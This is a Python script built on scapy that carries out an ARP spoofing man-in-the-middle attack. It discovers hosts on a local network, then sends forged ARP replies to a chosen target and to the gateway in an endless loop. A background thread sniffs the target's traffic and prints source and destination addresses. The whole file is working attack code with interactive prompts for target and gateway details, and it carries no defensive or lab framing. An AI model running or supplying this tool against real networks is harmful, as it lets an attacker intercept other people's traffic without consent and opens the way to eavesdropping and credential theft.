import threading
import time

import scapy.all as net
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, ARP


def find_devices(network_range):
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    replies, _ = net.srp(request, timeout=2, verbose=False)
    for sent, received in replies:
        print(f"Device found: {received.psrc} at {received.hwsrc}")


def run_spoof(gateway_ip, gateway_mac, target_ip, target_mac):
    target_pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    gateway_pkt = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    while True:
        net.sendp(target_pkt, verbose=False)
        net.sendp(gateway_pkt, verbose=False)
        time.sleep(1.5)


def capture_traffic(target_ip):
    def show_pkt(pkt):
        if pkt.haslayer(IP):
            print(f"{pkt[IP].src} sending to {pkt[IP].dst}")

    net.sniff(filter=f"host {target_ip}", prn=show_pkt, store=False)


def start():
    net_range = input("Enter network range to scan: ")
    find_devices(net_range)

    target_ip = input("Target IP: ")
    target_mac = input("Target MAC: ")
    router_ip = input("Gateway IP: ")
    router_mac = input("Gateway MAC: ")

    monitor = threading.Thread(target=capture_traffic, args=(target_ip,), daemon=True)
    monitor.start()

    print("Starting, Ctrl+C to stop...")
    try:
        run_spoof(router_ip, router_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    start()